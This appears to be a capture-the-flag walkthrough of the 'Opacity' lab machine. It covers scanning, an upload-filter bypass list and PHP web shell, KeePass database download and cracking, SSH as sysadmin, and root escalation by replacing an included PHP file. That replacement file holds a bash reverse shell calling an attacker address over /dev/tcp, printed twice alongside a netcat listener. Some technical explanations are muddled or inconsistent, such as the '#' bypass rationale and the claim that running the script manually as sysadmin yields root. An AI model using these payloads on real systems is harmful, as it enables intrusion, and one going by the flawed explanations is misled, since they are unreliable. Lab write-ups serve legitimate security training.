# Opacity CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Opacity machine, beginning with service enumeration and ending in full root access. The challenge combines a web application upload bypass, a malicious file upload to a reachable directory, credential recovery from a KeePass database, SSH pivoting as a low-privileged user, and a final root privilege escalation by abusing a PHP include path used by a privileged script.

The red path is as follows:

- enumerate the exposed services
- identify an upload function in the `/cloud` directory
- bypass file extension filters and drop a web shell
- obtain a shell as the web server user (`www-data`)
- download a KeePass database and crack it
- log in as `sysadmin`
- inspect a backup script and abused include file
- overwrite the included library with a malicious payload to execute as root
- read the final proof flag and complete the challenge

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify the services running on the target.

```bash
nmap -sV 10.112.138.145
```

### Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 15:04 -0400
Nmap scan report for 10.112.138.145
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (reset)

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

This reveals a Linux-based host exposing SSH and a web application. The HTTP service is the primary target.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

### Directory Discovery

The application initially redirects to a login page and a `/cloud` directory is discovered during manual review.

```bash
feroxbuster -u http://10.112.138.145/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Relevant Output

```text
302      GET        0l        0w        0c http://10.112.138.145/ => login.php
301      GET        9l       28w      314c http://10.112.138.145/css => http://10.112.138.145/css/
302      GET        0l        0w        0c http://10.112.138.145/index.php => login.php
200      GET       89l      341w     2689c http://10.112.138.145/css/style.css
200      GET       34l       60w      848c http://10.112.138.145/login.php
302      GET        0l        0w        0c http://10.112.138.145/logout.php => login.php
```

The `/cloud` directory is identified as the interesting path. It is also the location where file uploads are allowed.

![Image Placeholder: Login page](./assets/login-page.png)

---

## 3. Upload Bypass and Web Shell

### Observation

The application allows file upload in the `/cloud` directory. The initial suspicion is that the backend enforces a blacklist on file extensions, attempting to block PHP execution.

The notes describe a classic file upload bypass using multiple extension variations:

```text
shell.php
shell.php.jpg
shell.pHp
shell.phP
shell.pHp.jpg
shell.php5
shell.php7
shell.php8
shell.phtml
```

None of these succeed under the blacklist, so the attacker moves to a more evasive bypass.

### Successful Payload

The final working upload uses a trailing hash (`#`) in the filename so that the application fails to detect the `.php` extension properly.

```text
shell.php#.jpg
```

This bypass works because the server or file handling logic treats anything after `#` as a fragment and may ignore the PHP extension during validation while still saving the file with the `.php` extension in a way that the web server executes.

The uploaded file is then accessed as:

```text
http://10.112.138.145/cloud/images/shell.php#.jpg
```

The attacker receives a web shell and confirms code execution as the web server user.

```bash
id
```

### Result

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms a successful remote code execution foothold.

![Image Placeholder: Uploaded shell](./assets/uploaded-shell.png)

---

## 4. File Retrieval and KeePass Database Recovery

### Downloading the Database

The attacker enumerates the filesystem and finds a KeePass database under `/opt`.

```bash
cd /opt
ls -la
```

```text
dataset.kdbx
```

The database is served via Python’s HTTP server from the compromised machine so it can be downloaded locally.

```bash
python3 -m http.server 9991
```

Then from the attacker machine:

```bash
wget http://10.112.173.223:9991/dataset.kdbx
```

### Identifying the File Type

```bash
file -k dataset.kdbx
```

```text
dataset.kdbx: Keepass password database 2.x KDBX\012- data
```

This confirms the file is a KeePass 2.x database and is a likely source of credentials.

### Cracking the Database

The attacker uses `keepass2john` to extract the hash and then cracks it using John the Ripper.

```bash
keepass2john dataset.kdbx > dataset.txt
```

The output includes a hash that can be processed by John.

```text
dataset:741852963
```

Then:

```bash
john dataset.txt
```

or by using the database with the appropriate wordlist.

The recovered credentials are:

```text
Username: sysadmin
Password: Cl0udP4ss40p4city#8700
```

This is the credential pair used to log in to the machine as `sysadmin`.

![Image Placeholder: KeePass database analysis](./assets/keepass.png)

---

## 5. SSH Access as `sysadmin`

### Login

```bash
ssh sysadmin@10.112.138.145
```

### Credentials

```text
Password: Cl0udP4ss40p4city#8700
```

The login succeeds.

### User Directory Enumeration

```bash
ls -la
``` 

```text
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 4 root     root     4099 Oct 28 20:09 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin  3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
```

The user flag is retrieved:

```bash
cat local.txt
```

This confirms the user-level foothold and retrieves the first challenge flag.

![Image Placeholder: SSH login as sysadmin](./assets/sysadmin-shell.png)

---

## 6. Backups and Script Review

### Researching the Relevant Files

The user inspects the scripts directory and identifies a PHP script that appears to generate a backup archive.

```bash
cat script.php
```

```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
```

This is important because `script.php` requires a file called `lib/backup.inc.php` in the same directory and calls a function named `zipData()`. If the attacker can influence the included library file, they may be able to inject malicious code into the script.

The notes indicate the directory structure is writable for the current user, while the script itself is not writable, but the include file is in the same directory and may be replaced by the attacker.

### Assessing the Weakness

The attacker cannot directly modify the main `script.php`, but the path containing the library file is editable. That means the attacker can replace the dependency with malicious code and then execute the script in a way that triggers the malicious include.

This becomes the final privilege escalation path.

> Important: The issue is not that `script.php` is writable; the issue is that the library it includes is either replaceable or directly executable in the intended workflow.

---

## 7. Privilege Escalation to Root

### Replacing the Include File

The attacker deletes the original include file and writes a malicious version that spawns a root shell.

```bash
cd /home/sysadmin/scripts
ls -la
rm lib/backup.inc.php
cat > lib/backup.inc.php <<'PHP'
<?php
system('/bin/bash -c "bash -i >& /dev/tcp/192.168.131.124/4444 0>&1"');
PHP
```

Then the compromised script is run in the same context that has permissions to trigger the backup workflow.

```bash
php script.php
```

### Listener on Attacker Side

```bash
nc -lvnp 4444
```

A reverse shell is received:

```text
connect to [192.168.131.124] from (UNKNOWN) [10.112.138.145] ...
# id
uid=0(root) gid=0(root) groups=0(root)
```

The result confirms root access.

![Image Placeholder: Root shell](./assets/root-shell.png)

---

## 8. Final Flag Retrieval

Once the root shell is active, the attacker enumerates the root directory.

```bash
ls -la /root
cat /root/proof.txt
```

### Final Output

```text
You have successfully completed the challenge!
```

This proves the challenge is fully completed.

---

## 9. Summary of the Exploit Chain

1. Enumerated the host with `nmap`
2. Discovered an upload capability under `/cloud`
3. Bypassed the extension filter using `shell.php#.jpg`
4. Uploaded a PHP web shell and obtained a `www-data` shell
5. Found a KeePass database under `/opt`
6. Downloaded and cracked the database to recover the `sysadmin` password
7. Logged in over SSH as `sysadmin`
8. Reviewed `script.php` and the required include file `lib/backup.inc.php`
9. Replaced the include file with a malicious payload
10. Triggered the script and received a root shell
11. Read `/root/proof.txt` and completed the challenge

---

## 10. Key Takeaways

- File upload filters are often bypassed with double extensions, trailing fragments, or path confusion.
- `#`-based bypasses may work when the backend ignores part of the filename.
- KeePass databases can reveal credentials when the database file is accessible.
- Include files and library dependencies are a classic route to privilege escalation when they are writable or replaceable.
- Privilege escalation does not always require a binary exploit; a malicious include file can be just as effective.

> Important: A root-run PHP script with a replaceable dependency file is a reliable privilege escalation path if the attacker can manipulate the include path.

---

## 11. Relevant Commands

```bash
nmap -sV 10.112.138.145
feroxbuster -u http://10.112.138.145/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
id
cd /opt
ls -la
python3 -m http.server 9991
wget http://10.112.173.223:9991/dataset.kdbx
file -k dataset.kdbx
keepass2john dataset.kdbx > dataset.txt
ssh sysadmin@10.112.138.145
cat local.txt
cat script.php
ls -la /home/sysadmin/scripts
rm lib/backup.inc.php
cat > lib/backup.inc.php <<'PHP'
<?php
system('/bin/bash -c "bash -i >& /dev/tcp/192.168.131.124/4444 0>&1"');
PHP
php script.php
nc -lvnp 4444
id
ls -la /root
cat /root/proof.txt
```

---

## Final Result

The Opacity machine was successfully compromised by bypassing a restricted file upload, extracting credentials from a KeePass database, accessing the `sysadmin` account, and exploiting a writable include dependency to spawn a root shell. The final proof flag was retrieved from `/root/proof.txt`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)

